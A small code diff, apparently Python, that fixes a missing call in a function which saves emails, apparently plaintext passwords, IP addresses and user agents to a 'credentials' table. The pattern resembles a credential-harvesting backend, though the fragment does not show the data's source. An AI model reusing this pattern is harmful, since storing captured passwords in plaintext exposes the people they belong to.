@@ -25,4 +25,4 @@ def insert_credential(email, password, ip, user_agent, timestamp):
                 INSERT INTO credentials (email, password, ip, user_agent, timestamp)
                 VALUES (?, ?, ?, ?, ?)
             ''', (email, password, ip, user_agent, timestamp))
-            conn.commit
+            conn.commit()
